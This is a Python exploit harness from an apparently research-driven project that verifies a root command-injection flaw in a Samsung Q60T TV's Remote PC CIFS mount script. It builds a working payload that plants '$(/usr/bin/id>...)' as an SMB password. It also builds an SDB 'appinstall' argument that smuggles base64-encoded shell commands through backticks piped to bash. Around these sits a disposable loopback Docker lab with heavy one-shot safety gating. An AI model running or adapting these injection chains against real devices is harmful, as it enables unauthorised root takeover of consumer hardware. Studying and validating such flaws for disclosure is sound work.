#!/usr/bin/env python3
"""Offline-first, one-shot validator for the Q60T Remote PC CIFS root path.

The default mode only audits pinned files in a local rootfs tar.  The local
lab mode binds Docker services to loopback.  Live mode is deliberately
interactive and terminal: it permits one UI trigger and one UID-0
classification, with no retry path.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import enum
import fcntl
import hashlib
import ipaddress
import json
import os
import re
import secrets
import select
import shlex
import signal
import socket
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.error
import urllib.request
import uuid
from collections.abc import Callable, Iterable, Mapping, Sequence
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parents[3]
DEFAULT_ROOTFS = REPO_ROOT / "private/fw-analysis/work/rootfs.tar"
DEFAULT_CONFIG = REPO_ROOT / "config/tv.env"
LAB_CONTEXT = Path(__file__).resolve().parents[1] / "lab"
DEFAULT_IMAGE = "tiz0wn-remotepc-lab:bookworm-impacket-0.13.1"
LAB_CONTEXT_LABEL = "org.tiz0wn.lab-context-sha256"
LAB_CONTEXT_FILES = (
    ".dockerignore",
    "Dockerfile",
    "client.py",
    "client.sh",
    "entrypoint.sh",
    "healthcheck.sh",
    "server.py",
    "startwm.sh",
    "xrdp-sesman.pam",
)
INVALID_LAB_PASSWORD = "TIZ0WN-INVALID-RDP-PASSWORD"

MODEL = "GQ55Q60TGUXZG"
FIRMWARE = "T-NKLDEUC-2743.0"
FIRMWARE_ARCHIVE_SHA256 = "cb717ed98daf9580eb5b84bccbad5adac82f75dd021ed028f1ee1bb6c4abde32"
ROOTFS_SHA256 = "a54c6b8e4ac739c92edda4b75a87ff42b7a100c9a974c85da0acbd8b9f337ce6"
SDB_SHA256 = "05db410d2e36e85147f95b20bae6296a71c54dab0e1ec79f9e11b89c4b6bd2cd"
SDB_PORT = 26101
API_PORT = 8001
LIVE_RDP_PORT = 3389
LIVE_SMB_PORT = 445
LEGACY_SMB_PORT = 1445
LOCAL_RDP_PORT = 13389
LOCAL_SMB_PORT = 11445
LAB_USER = "q60t"
MAX_APPINSTALL_BYTES = 480
APPINSTALL_PREFIX = "0 appinstall tpk "
GATE_ROOT = "/tmp"

LIVE_CONFIRMATION = "TIZ0WN-REMOTEPC-CIFS-ROOT-ONE-SHOT-2743"
PROFILE_ACK = "I-ACCEPT-A-TEMPORARY-SAVED-REMOTE-PC-PROFILE"
NO_RETRY_ACK = "ONE-TRIGGER-ONE-CLASSIFICATION-NO-RETRY"
FIRMWARE_GATE = f"FIRMWARE {FIRMWARE} VERIFIED"
FORM_GATE = "REMOTE PC FORM VERIFIED"
RDP_GATE = "RDP SESSION VISIBLE"
TRIGGER_GATE = "SHARED FOLDER CLICKED ONCE"

MEMBER_HASHES = {
    "./usr/apps/privileged-service/bin/mount.smb.sh":
        "37aaf2f05bf714332a6bf8f14b543ac9584a1b9a051341674a74fc0dd753c57e",
    "./usr/apps/privileged-service/bin/ps_agent":
        "402885bce04ca3a04c2cb322cbe83dd96d05e17457717b4627a85b0fdb004c33",
    "./usr/apps/org.tizen.remotepc/bin/remotepc_uilauncher":
        "b87e23127fe04cfab9e2c43468a99a4c4aa0b852fd5923de17104c3cf9d872da",
    "./usr/apps/org.tizen.remotepc/bin/remotepc_rdp":
        "5d5b8277b20cae7ec993be7ff8f556a5f04cdff07109beb025c0e377f4dff9e4",
    "./usr/share/packages/org.tizen.remotepc.xml":
        "7b0539507d10019635e502876a7c48446a2112f6c0d9b48f706afb797e9c0659",
}
MOUNT_SCRIPT = "./usr/apps/privileged-service/bin/mount.smb.sh"
MOUNT_SCRIPT_ANCHORS = (
    b"FileContent=$(read_credentials $FileName)",
    b"UTIL_OPT=${UTIL_OPT/credentials=${FileName}/$FileContent}",
    b"UTIL_OPT=${UTIL_OPT//$SMB_PATH_TEMPLATE/$SMB_PATH}",
    b'[[ "$debug" == "false" ]] && /bin/bash -c "$UTIL $UTIL_OPT"',
)

PRIVATE_NETWORKS = tuple(ipaddress.ip_network(item) for item in (
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
))
CONFIG_KEYS = {
    "SDB", "TV_IP", "TV_SERIAL", "HOST_IP", "TV_MODEL", "TV_FIRMWARE",
    "TV_ID_SHA256", "SDB_TIMEOUT",
}


class ProofError(RuntimeError):
    """Expected fail-closed refusal."""


class InterruptedRun(ProofError):
    """A signal stopped the one-shot before another action could be attempted."""


class Phase(enum.Enum):
    CREATED = "created"
    OFFLINE_AUDITED = "offline-audited"
    TARGET_VERIFIED = "target-verified"
    LAB_RUNNING = "lab-running"
    LAB_SELFTESTED = "lab-selftested"
    FORM_VERIFIED = "form-verified"
    RDP_VISIBLE = "rdp-visible"
    TRIGGER_WINDOW_CLOSED = "trigger-window-closed"
    CLASSIFIED = "classified"
    CLEANED = "cleaned"


NEXT_PHASE = {
    Phase.CREATED: Phase.OFFLINE_AUDITED,
    Phase.OFFLINE_AUDITED: Phase.TARGET_VERIFIED,
    Phase.TARGET_VERIFIED: Phase.LAB_RUNNING,
    Phase.LAB_RUNNING: Phase.LAB_SELFTESTED,
    Phase.LAB_SELFTESTED: Phase.FORM_VERIFIED,
    Phase.FORM_VERIFIED: Phase.RDP_VISIBLE,
    Phase.RDP_VISIBLE: Phase.TRIGGER_WINDOW_CLOSED,
    Phase.TRIGGER_WINDOW_CLOSED: Phase.CLASSIFIED,
    Phase.CLASSIFIED: Phase.CLEANED,
}


@dataclass
class OneShotState:
    phase: Phase = Phase.CREATED
    trigger_claimed: bool = False
    classification_claimed: bool = False

    def advance(self, phase: Phase) -> None:
        if NEXT_PHASE.get(self.phase) != phase:
            raise ProofError(f"invalid state transition: {self.phase.value} -> {phase.value}")
        self.phase = phase

    def claim_trigger(self) -> None:
        if self.phase is not Phase.RDP_VISIBLE or self.trigger_claimed:
            raise ProofError("the single UI trigger is unavailable or already consumed")
        self.trigger_claimed = True

    def close_trigger_window(self) -> None:
        if not self.trigger_claimed:
            raise ProofError("cannot close an unclaimed trigger window")
        self.advance(Phase.TRIGGER_WINDOW_CLOSED)

    def claim_classification(self) -> None:
        if self.phase is not Phase.TRIGGER_WINDOW_CLOSED or self.classification_claimed:
            raise ProofError("the single classification is unavailable or already consumed")
        self.classification_claimed = True

    def mark_cleaned(self) -> None:
        self.phase = Phase.CLEANED


@dataclass(frozen=True)
class RunIdentity:
    run_id: str
    share: str
    marker: str
    gate_token: str
    stage: str
    container: str

    @property
    def payload(self) -> str:
        return f"$(/usr/bin/id>{self.marker})"

    @property
    def fingerprint(self) -> str:
        return hashlib.sha256(self.run_id.encode("ascii")).hexdigest()[:16]


@dataclass(frozen=True)
class TargetConfig:
    sdb: Path
    tv_ip: str
    tv_serial: str
    host_ip: str
    model: str
    firmware: str
    tv_id_sha256: str
    sdb_timeout: int = 30


@dataclass
class RunRecord:
    run_fingerprint: str
    mode: str
    events: list[str] = field(default_factory=list)
    result: str = "in-progress"

    def add(self, event: str) -> None:
        if not re.fullmatch(r"[a-z0-9][a-z0-9_.:-]{0,79}", event):
            raise ProofError("refusing unsafe run-record event")
        self.events.append(event)

    def write(self, directory: Path) -> Path:
        directory.mkdir(parents=True, exist_ok=True, mode=0o700)
        timestamp = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        path = directory / f"{timestamp}-{self.run_fingerprint}.json"
        document = {
            "schema": 1,
            "project": "tiz0wn",
            "mode": self.mode,
            "run_fingerprint": self.run_fingerprint,
            "model": MODEL,
            "firmware": FIRMWARE,
            "events": self.events,
            "result": self.result,
        }
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as stream:
            json.dump(document, stream, indent=2, sort_keys=True)
            stream.write("\n")
        return path


class Runner:
    """Subprocess adapter kept injectable for offline contract tests."""

    def run(
        self,
        arguments: Sequence[str],
        *,
        timeout: int = 30,
        check: bool = True,
        input_text: str | None = None,
    ) -> subprocess.CompletedProcess[str]:
        try:
            result = subprocess.run(
                tuple(arguments),
                capture_output=True,
                text=True,
                input=input_text,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired as error:
            raise ProofError("a bounded local command timed out") from error
        if check and result.returncode != 0:
            raise ProofError("a bounded local command failed")
        return result


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def lab_context_sha256(context: Path = LAB_CONTEXT) -> str:
    """Hash exactly the source files admitted by the lab's .dockerignore."""
    digest = hashlib.sha256(b"tiz0wn-remotepc-lab-context-v1\0")
    for relative in LAB_CONTEXT_FILES:
        path = context / relative
        if not path.is_file() or path.is_symlink():
            raise ProofError("lab build context contains a missing or unsafe source file")
        data = path.read_bytes()
        name = relative.encode("utf-8")
        digest.update(str(len(name)).encode("ascii") + b":" + name)
        digest.update(str(len(data)).encode("ascii") + b":" + data)
    return digest.hexdigest()


def audit_firmware(rootfs: Path) -> dict[str, str]:
    """Verify pinned members in place; never extract firmware to the host."""
    if not rootfs.is_file() or rootfs.is_symlink():
        raise ProofError("rootfs must be a regular, non-symlink file")
    if sha256_file(rootfs) != ROOTFS_SHA256:
        raise ProofError("exact rootfs tar SHA-256 mismatch")
    observed: dict[str, str] = {}
    mount_bytes = b""
    try:
        with tarfile.open(rootfs, "r:") as archive:
            names = {member.name for member in archive.getmembers()}
            missing = set(MEMBER_HASHES) - names
            if missing:
                raise ProofError("rootfs is missing one or more pinned Remote PC members")
            for name, expected in MEMBER_HASHES.items():
                member = archive.getmember(name)
                if not member.isfile() or member.size <= 0 or member.size > 64 * 1024 * 1024:
                    raise ProofError("a pinned rootfs member is not a bounded regular file")
                stream = archive.extractfile(member)
                if stream is None:
                    raise ProofError("a pinned rootfs member cannot be read")
                digest = hashlib.sha256()
                chunks: list[bytes] = []
                size = 0
                while True:
                    chunk = stream.read(1024 * 1024)
                    if not chunk:
                        break
                    size += len(chunk)
                    digest.update(chunk)
                    if name == MOUNT_SCRIPT:
                        chunks.append(chunk)
                if size != member.size or digest.hexdigest() != expected:
                    raise ProofError("pinned Remote PC member hash mismatch")
                observed[name] = digest.hexdigest()
                if name == MOUNT_SCRIPT:
                    mount_bytes = b"".join(chunks)
    except (tarfile.TarError, OSError, EOFError) as error:
        raise ProofError("rootfs tar is unreadable or malformed") from error
    if not all(anchor in mount_bytes for anchor in MOUNT_SCRIPT_ANCHORS):
        raise ProofError("mount.smb.sh no longer contains the reviewed source-to-sink anchors")
    return observed


def fresh_identity(token_factory: Callable[[int], str] = secrets.token_hex) -> RunIdentity:
    values = [token_factory(size) for size in (8, 5, 8, 8, 8)]
    patterns = (16, 10, 16, 16, 16)
    if any(not isinstance(value, str) or not re.fullmatch(rf"[0-9a-f]{{{length}}}", value)
           for value, length in zip(values, patterns, strict=True)):
        raise ProofError("cryptographic identity source returned an invalid token")
    if len(set(values)) != len(values):
        raise ProofError("fresh run identifiers must not be reused")
    run_id, share_token, marker_token, gate_token, stage_token = values
    return RunIdentity(
        run_id=run_id,
        share="Q6" + share_token.upper(),
        marker="/tmp/q60t-rpc-" + marker_token,
        gate_token=gate_token,
        stage="/home/owner/share/tmp/sdk_tools/r" + stage_token,
        container="tiz0wn-rpc-" + run_id,
    )


def reserve_identity(identity: RunIdentity, ledger: Path) -> None:
    """Atomically reserve hashed names without persisting target paths or payloads."""
    ledger.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    if ledger.exists() and ledger.is_symlink():
        raise ProofError("identity ledger must not be a symlink")
    flags = os.O_RDWR | os.O_APPEND | os.O_CREAT
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    fd = os.open(ledger, flags, 0o600)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        with os.fdopen(fd, "r+", encoding="utf-8", closefd=False) as stream:
            stream.seek(0)
            prior = {line.strip() for line in stream if line.strip()}
            fields = (identity.run_id, identity.share, identity.marker,
                      identity.gate_token, identity.stage)
            fingerprints = [hashlib.sha256(item.encode("ascii")).hexdigest() for item in fields]
            if any(item in prior for item in fingerprints):
                raise ProofError("a generated one-shot name has already been reserved")
            stream.seek(0, os.SEEK_END)
            for item in fingerprints:
                stream.write(item + "\n")
            stream.flush()
            os.fsync(stream.fileno())
    finally:
        fcntl.flock(fd, fcntl.LOCK_UN)
        os.close(fd)


def build_payload(marker: str) -> str:
    if not re.fullmatch(r"/tmp/q60t-rpc-[0-9a-f]{16}", marker):
        raise ProofError("refusing an invalid proof marker path")
    return f"$(/usr/bin/id>{marker})"


def injection_argument(command: str, token: str) -> str:
    if not re.fullmatch(r"[0-9a-f]{16}", token):
        raise ProofError("injection token must be 16 lowercase hexadecimal digits")
    if any(character in command for character in ("\n", "\r", "\0")):
        raise ProofError("injected predicate must be one line")
    script = f"/bin/mkdir {GATE_ROOT}/s-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode("ascii")).decode("ascii")
    argument = APPINSTALL_PREFIX + (
        f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    )
    if len(argument.encode("ascii")) > MAX_APPINSTALL_BYTES:
        raise ProofError("encoded SDB argument exceeds the reviewed bound")
    return argument


def uid0_predicate(identity: RunIdentity) -> str:
    build_payload(identity.marker)
    if not re.fullmatch(r"/home/owner/share/tmp/sdk_tools/r[0-9a-f]{16}", identity.stage):
        raise ProofError("invalid terminal classification stage")
    return (
        f"[ -f {identity.marker} ]&&"
        f"[ \"$(stat -c %u {identity.marker})\" = 0 ]&&"
        f"grep -q '^uid=0(root) gid=0(root)' {identity.marker}&&"
        f"mkdir {identity.stage}"
    )


def _expand_config(value: str, known: Mapping[str, str]) -> str:
    if "`" in value or "$(" in value or "${" in value and re.search(r"\$\{[^A-Za-z_]", value):
        raise ProofError("config contains forbidden shell syntax")

    def replace(match: re.Match[str]) -> str:
        name = match.group(1) or match.group(2)
        if name not in known:
            raise ProofError("config references an unknown variable")
        return known[name]

    expanded = re.sub(r"\$([A-Za-z_][A-Za-z0-9_]*)|\$\{([A-Za-z_][A-Za-z0-9_]*)\}",
                      replace, value)
    if "$" in expanded:
        raise ProofError("config contains unsupported variable syntax")
    return expanded


def parse_config_text(text: str, *, home: str | None = None) -> dict[str, str]:
    values: dict[str, str] = {}
    known: dict[str, str] = {"HOME": home if home is not None else str(Path.home())}
    for number, source in enumerate(text.splitlines(), 1):
        stripped = source.strip()
        if not stripped or stripped.startswith("#"):
            continue
        match = re.fullmatch(r"([A-Z][A-Z0-9_]*)\s*=\s*(.*)", stripped)
        if match is None or match.group(1) not in CONFIG_KEYS:
            raise ProofError(f"unsupported config line {number}")
        key, raw = match.groups()
        try:
            words = shlex.split(raw, comments=True, posix=True)
        except ValueError as error:
            raise ProofError(f"malformed config line {number}") from error
        if len(words) != 1:
            raise ProofError(f"config line {number} must contain exactly one value")
        value = _expand_config(words[0], {**known, **values})
        values[key] = value
    return values


def require_private_ipv4(value: str, label: str, *, loopback: bool = False) -> str:
    try:
        address = ipaddress.IPv4Address(value)
    except ipaddress.AddressValueError as error:
        raise ProofError(label + " must be a canonical IPv4 literal") from error
    if str(address) != value or address.is_unspecified or address.is_multicast:
        raise ProofError(label + " must be a canonical unicast IPv4 literal")
    if loopback:
        if not address.is_loopback:
            raise ProofError(label + " must be loopback")
    elif address.is_loopback or not any(address in network for network in PRIVATE_NETWORKS):
        raise ProofError(label + " must be an RFC1918 address")
    return value


def load_target_config(path: Path) -> TargetConfig:
    if not path.is_file() or path.is_symlink():
        raise ProofError("live mode requires a regular config/tv.env")
    values = parse_config_text(path.read_text(encoding="utf-8"))
    required = {"SDB", "TV_IP", "TV_SERIAL", "HOST_IP", "TV_MODEL",
                "TV_FIRMWARE", "TV_ID_SHA256"}
    if not required.issubset(values):
        raise ProofError("live config is missing a required target identity field")
    tv_ip = require_private_ipv4(values["TV_IP"], "TV IP")
    host_ip = require_private_ipv4(values["HOST_IP"], "host IP")
    if tv_ip == host_ip or ipaddress.ip_network(tv_ip + "/24", strict=False) != ipaddress.ip_network(
            host_ip + "/24", strict=False):
        raise ProofError("TV and host must differ and share the same /24")
    if values["TV_SERIAL"] != f"{tv_ip}:{SDB_PORT}":
        raise ProofError("TV_SERIAL must exactly match TV_IP:26101")
    if values["TV_MODEL"] != MODEL or values["TV_FIRMWARE"] != FIRMWARE:
        raise ProofError("configured model or firmware does not match the reviewed build")
    device_hash = values["TV_ID_SHA256"]
    if not re.fullmatch(r"[0-9a-f]{64}", device_hash) or device_hash == "0" * 64:
        raise ProofError("TV_ID_SHA256 must be a nonzero lowercase SHA-256")
    sdb = Path(values["SDB"])
    if not sdb.is_absolute() or not sdb.is_file() or sdb.is_symlink() or not os.access(sdb, os.X_OK):
        raise ProofError("SDB must be an existing absolute executable regular file")
    if sha256_file(sdb) != SDB_SHA256:
        raise ProofError("SDB executable hash differs from the reviewed tool")
    try:
        timeout = int(values.get("SDB_TIMEOUT", "30"))
    except ValueError as error:
        raise ProofError("SDB_TIMEOUT must be an integer") from error
    if timeout < 5 or timeout > 60:
        raise ProofError("SDB_TIMEOUT must be between 5 and 60 seconds")
    return TargetConfig(sdb, tv_ip, values["TV_SERIAL"], host_ip, MODEL, FIRMWARE,
                        device_hash, timeout)


def hash_device_id_json(path: Path) -> str:
    """Return only the hash needed by tv.env; never print the raw API ID."""
    if not path.is_file() or path.is_symlink() or path.stat().st_size > 65536:
        raise ProofError("device JSON must be a bounded regular file")
    try:
        document = json.loads(path.read_text(encoding="utf-8"))
        value = document["device"]["id"]
    except (OSError, UnicodeError, ValueError, TypeError, KeyError) as error:
        raise ProofError("device JSON lacks an exact API device.id string") from error
    try:
        identifier = uuid.UUID(value[5:]) if isinstance(value, str) and value.startswith("uuid:") else None
    except ValueError as error:
        raise ProofError("API device.id is not a canonical nonzero UUID value") from error
    if identifier is None or identifier.int == 0 or value != "uuid:" + str(identifier):
        raise ProofError("API device.id is not a canonical nonzero UUID value")
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


class RejectRedirects(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def direct_urlopen(request: urllib.request.Request, *, timeout: int):
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), RejectRedirects())
    return opener.open(request, timeout=timeout)


def _api_firmware_compatible(value: object) -> bool:
    if value is None or str(value).strip().lower() in {"", "unknown", "null"}:
        return True
    compact = re.sub(r"\s+", "", str(value).upper())
    platform_ok = "NKLDEUC" in compact or compact in {"2743", "2743.0", "02743", "02743.0"}
    version_ok = re.search(r"(?:^|\D)0?2743(?:\.0)?(?:\D|$)", compact) is not None
    return platform_ok and version_ok


def require_target_api(
    config: TargetConfig,
    *,
    urlopen: Callable[..., Any] = direct_urlopen,
) -> None:
    request = urllib.request.Request(
        f"http://{config.tv_ip}:{API_PORT}/api/v2/",
        headers={"Accept": "application/json"},
    )
    try:
        with urlopen(request, timeout=5) as response:
            if response.status != 200:
                raise ProofError("TV API did not return HTTP 200")
            body = response.read(65537)
    except (urllib.error.URLError, OSError, TimeoutError) as error:
        raise ProofError("TV identity API is unavailable") from error
    if len(body) > 65536:
        raise ProofError("TV identity response exceeds its bound")
    try:
        device = json.loads(body)["device"]
        observed_id = str(device["id"])
        model = device["modelName"]
        developer_mode = str(device["developerMode"])
        developer_ip = device["developerIP"]
    except (ValueError, TypeError, KeyError) as error:
        raise ProofError("TV identity response lacks required fields") from error
    observed_hash = hashlib.sha256(observed_id.encode("utf-8")).hexdigest()
    if (model != MODEL or developer_mode != "1" or developer_ip != config.host_ip or
            observed_hash != config.tv_id_sha256 or
            not _api_firmware_compatible(device.get("firmwareVersion"))):
        raise ProofError("TV identity, build, or Developer Mode binding mismatch")


def _text_errors(result: subprocess.CompletedProcess[str]) -> list[str]:
    output = (result.stdout or "") + "\n" + (result.stderr or "")
    return [line.strip() for line in output.splitlines()
            if line.lstrip().lower().startswith("error:")]


def require_sdb_device(config: TargetConfig, *, runner: Runner) -> None:
    result = runner.run((str(config.sdb), "devices"), timeout=15, check=False)
    if result.returncode != 0 or _text_errors(result):
        raise ProofError("SDB device enumeration failed")
    matches = [line.split() for line in result.stdout.splitlines()
               if line.split()[:1] == [config.tv_serial]]
    if len(matches) != 1 or len(matches[0]) < 2 or matches[0][1] != "device":
        raise ProofError("the exact configured SDB serial is not in device state")


def classify_uid0_once(
    config: TargetConfig,
    identity: RunIdentity,
    local_marker: Path,
    state: OneShotState,
    *,
    runner: Runner,
) -> bool:
    """Run the combined predicate once, then perform exactly two SDB pushes."""
    state.claim_classification()
    if not local_marker.is_file() or local_marker.is_symlink():
        raise ProofError("local classification marker must be a regular file")
    argument = injection_argument(uid0_predicate(identity), identity.gate_token)
    try:
        # appinstall status is intentionally ignored: only the two-push shape is evidence.
        runner.run((str(config.sdb), "-s", config.tv_serial, "shell", argument),
                   timeout=config.sdb_timeout, check=False)
    except ProofError as error:
        raise ProofError("classification injection timed out or failed; do not retry") from error
    first = runner.run((str(config.sdb), "-s", config.tv_serial, "push",
                        str(local_marker), identity.stage), timeout=20, check=False)
    if first.returncode != 0 or _text_errors(first):
        raise ProofError("first classification push failed; classification is terminal")
    second = runner.run((str(config.sdb), "-s", config.tv_serial, "push",
                         str(local_marker), identity.stage + "/attest"),
                        timeout=20, check=False)
    errors = _text_errors(second)
    if second.returncode == 0 and not errors:
        return True
    expected = (": No such file or directory", ": Not a directory")
    if errors and all(line.endswith(expected) for line in errors):
        return False
    raise ProofError("unexpected second classification result; classification is terminal")


def port_available(address: str, port: int) -> bool:
    family = socket.AF_INET
    with socket.socket(family, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((address, port))
        except OSError:
            return False
    return True


def require_ports_available(address: str, ports: Iterable[int]) -> None:
    if any(not port_available(address, port) for port in ports):
        raise ProofError("a required lab port is already occupied on the exact bind address")


def port_open(address: str, port: int, *, timeout: float = 0.3) -> bool:
    try:
        with socket.create_connection((address, port), timeout=timeout):
            return True
    except OSError:
        return False


def require_ports_closed(address: str, ports: Iterable[int], *, timeout: float = 8.0) -> None:
    deadline = time.monotonic() + timeout
    remaining = tuple(ports)
    while time.monotonic() < deadline:
        if not any(port_open(address, port) for port in remaining):
            return
        time.sleep(0.2)
    raise ProofError("one or more lab ports remained open after cleanup")


RDP_NEGOTIATION_REQUEST = bytes.fromhex(
    "030000130ee000000000000100080003000000"
)


def rdp_protocol_selftest(address: str, port: int) -> None:
    try:
        with socket.create_connection((address, port), timeout=5) as connection:
            connection.sendall(RDP_NEGOTIATION_REQUEST)
            response = connection.recv(64)
    except OSError as error:
        raise ProofError("local RDP protocol self-test failed") from error
    if len(response) < 11 or response[:2] != b"\x03\x00" or response[5] != 0xD0:
        raise ProofError("local RDP service returned an unexpected negotiation response")


class Lab:
    def __init__(
        self,
        identity: RunIdentity,
        *,
        bind: str,
        rdp_port: int,
        smb_port: int,
        image: str = DEFAULT_IMAGE,
        runner: Runner | None = None,
    ) -> None:
        if not re.fullmatch(r"tiz0wn-rpc-[0-9a-f]{16}", identity.container):
            raise ProofError("invalid disposable container name")
        if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._:/-]{0,127}", image):
            raise ProofError("invalid lab image name")
        self.identity = identity
        self.bind = bind
        self.rdp_port = rdp_port
        self.smb_port = smb_port
        self.image = image
        self.runner = runner or Runner()
        self.context_sha256 = lab_context_sha256()
        self._temporary: tempfile.TemporaryDirectory[str] | None = None
        self._cleanup_armed = False
        self._image_id: str | None = None
        self._rdp_login_baseline = 0

    @property
    def client_container(self) -> str:
        return self.identity.container + "-client"

    def build(self) -> None:
        self._image_id = None
        with tempfile.TemporaryDirectory(prefix="tiz0wn-rpc-context-") as temporary:
            snapshot = Path(temporary)
            for relative in LAB_CONTEXT_FILES:
                source = LAB_CONTEXT / relative
                if not source.is_file() or source.is_symlink():
                    raise ProofError("lab build context contains a missing or unsafe source file")
                (snapshot / relative).write_bytes(source.read_bytes())
            snapshot_digest = lab_context_sha256(snapshot)
            if lab_context_sha256() != snapshot_digest:
                raise ProofError("lab source changed while its build snapshot was created")
            self.context_sha256 = snapshot_digest
            result = self.runner.run((
                "docker", "build", "--quiet", "--label",
                f"{LAB_CONTEXT_LABEL}={self.context_sha256}",
                "--tag", self.image, str(snapshot),
            ), timeout=900)
            if lab_context_sha256() != snapshot_digest:
                raise ProofError("lab source changed while its image was built")
        image_id = result.stdout.strip()
        if not re.fullmatch(r"sha256:[0-9a-f]{64}", image_id):
            raise ProofError("Docker did not return an immutable lab image ID")
        self._image_id = self._verified_image_id(image_id)

    def _verified_image_id(self, image_id: str) -> str:
        result = self.runner.run(("docker", "image", "inspect", image_id),
                                 timeout=15, check=False)
        if result.returncode != 0 or _text_errors(result):
            raise ProofError("the disposable lab image is unavailable or cannot be inspected")
        try:
            documents = json.loads(result.stdout)
            image_id = documents[0]["Id"]
            labels = documents[0]["Config"]["Labels"] or {}
        except (ValueError, TypeError, KeyError, IndexError) as error:
            raise ProofError("the disposable lab image metadata is malformed") from error
        if (not isinstance(image_id, str) or
                not re.fullmatch(r"sha256:[0-9a-f]{64}", image_id) or
                labels.get(LAB_CONTEXT_LABEL) != self.context_sha256):
            raise ProofError(
                "the disposable lab image is stale or not built from the current reviewed source"
            )
        return image_id

    def _write_secrets(self) -> Path:
        self._temporary = tempfile.TemporaryDirectory(prefix="tiz0wn-rpc-secrets-")
        directory = Path(self._temporary.name)
        os.chmod(directory, 0o700)
        values = {
            "username": LAB_USER,
            "password": build_payload(self.identity.marker),
            "share": self.identity.share,
            "host": self.bind,
            "rdp_port": str(self.rdp_port),
            "smb_port": str(self.smb_port),
        }
        for name, value in values.items():
            path = directory / name
            path.write_text(value, encoding="utf-8")
            os.chmod(path, 0o600)
        return directory

    def start(self) -> None:
        require_ports_available(self.bind, (self.rdp_port, self.smb_port))
        self._require_container_absent(self.identity.container)
        self._require_container_absent(self.client_container)
        if self._image_id is None:
            raise ProofError("the disposable lab image was not built in this run")
        if lab_context_sha256() != self.context_sha256:
            raise ProofError("lab source changed after its image was built")
        self._image_id = self._verified_image_id(self._image_id)
        secrets_dir = self._write_secrets()
        arguments = (
            "docker", "run", "--detach",
            "--name", self.identity.container,
            "--hostname", "tiz0wn-lab",
            "--pids-limit", "256",
            "--publish", f"{self.bind}:{self.rdp_port}:3389",
            "--publish", f"{self.bind}:{self.smb_port}:445",
            "--mount", f"type=bind,source={secrets_dir},target=/run/q60t-secrets,readonly",
            "--label", "org.tiz0wn.role=remotepc-one-shot-lab",
            self._image_id,
        )
        # Arm cleanup before invoking Docker: a client timeout may occur after
        # the daemon has already created and published the exact-name container.
        self._cleanup_armed = True
        self.runner.run(arguments, timeout=60)
        self._wait_healthy()
        self._require_exact_publish()

    def _require_container_absent(self, name: str) -> None:
        result = self.runner.run(("docker", "inspect", name), timeout=10, check=False)
        if result.returncode == 0:
            raise ProofError("a stale disposable lab container already exists")
        if not self._is_exact_absence(result, name):
            raise ProofError("Docker could not prove the disposable container name is unused")

    @staticmethod
    def _is_exact_absence(result: subprocess.CompletedProcess[str], name: str) -> bool:
        errors = (result.stderr or "").strip().lower()
        expected = {
            f"error: no such object: {name}".lower(),
            f"error: no such container: {name}".lower(),
        }
        return result.returncode != 0 and (result.stdout or "").strip() in {"", "[]"} and errors in expected

    def _wait_healthy(self, *, timeout: float = 45.0) -> None:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            result = self.runner.run((
                "docker", "inspect", "--format",
                "{{.State.Running}} {{if .State.Health}}{{.State.Health.Status}}{{else}}missing{{end}}",
                self.identity.container,
            ), timeout=10, check=False)
            status = result.stdout.strip()
            if result.returncode == 0 and status == "true healthy":
                return
            if result.returncode == 0 and status.startswith("false "):
                raise ProofError("disposable RDP/SMB lab exited before becoming healthy")
            time.sleep(0.25)
        raise ProofError("disposable RDP/SMB lab did not become healthy")

    def _require_exact_publish(self) -> None:
        result = self.runner.run(("docker", "inspect", self.identity.container), timeout=15)
        try:
            ports = json.loads(result.stdout)[0]["NetworkSettings"]["Ports"]
            rdp = ports["3389/tcp"]
            smb = ports["445/tcp"]
        except (ValueError, TypeError, KeyError, IndexError) as error:
            raise ProofError("cannot verify disposable lab port bindings") from error
        expected = {(self.bind, str(self.rdp_port)), (self.bind, str(self.smb_port))}
        observed = {(entry["HostIp"], entry["HostPort"]) for entry in (*rdp, *smb)}
        if observed != expected or len(rdp) != 1 or len(smb) != 1:
            raise ProofError("disposable lab is not bound only to the configured host address")

    def selftest(self) -> None:
        if self._temporary is None or self._image_id is None:
            raise ProofError("verified lab image or secrets are unavailable for self-test")
        rdp_protocol_selftest(self.bind, self.rdp_port)
        self._require_exact_password_authentication()
        arguments = (
            "docker", "run", "--detach", "--rm", "--name", self.client_container,
            "--network", "host",
            "--mount",
            f"type=bind,source={self._temporary.name},target=/run/q60t-secrets,readonly",
            "--entrypoint", "/usr/local/sbin/tiz0wn-lab-client",
            self._image_id,
        )
        self.runner.run(arguments, timeout=30)
        deadline = time.monotonic() + 45
        observed = ""
        rdp_observed = ""
        while time.monotonic() < deadline:
            observed = self.logs()
            rdp_observed = self.rdp_logs()
            smb_ok = observed.count("NetrShareEnum Level: 1") == 1
            rdp_logins = self._count_rdp_logins(rdp_observed)
            rdp_rejections = self._count_rdp_rejections(rdp_observed)
            xorg_ok = ("Session started successfully for user q60t" in rdp_observed and
                       rdp_rejections == 1 and rdp_logins == 1)
            if smb_ok and xorg_ok:
                self._require_secret_absent_from_process_arguments()
                break
